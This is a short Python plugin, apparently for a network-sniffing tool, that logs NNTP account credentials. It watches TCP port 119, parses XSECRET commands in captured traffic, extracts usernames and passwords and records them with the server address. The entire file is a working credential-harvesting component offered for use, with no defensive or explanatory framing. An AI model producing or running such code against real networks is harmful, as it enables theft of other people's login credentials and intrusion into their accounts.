"""NNTP password logger"""
PROPERTY={}
PROPERTY['NAME']="NNTP Logger"
PROPERTY['DESC']="This logs all the NNTP accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=119
PROPERTY['DPORT']=119
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:7].lower() =="xsecret"):
            	line = line.split(' ')
            	user, passwd = line[1], line[2]
        if (user != None and passwd != None):
                self.logger.addInfo('NNTP',self.traffic.dst,user,passwd)
                user = None
                passwd = None
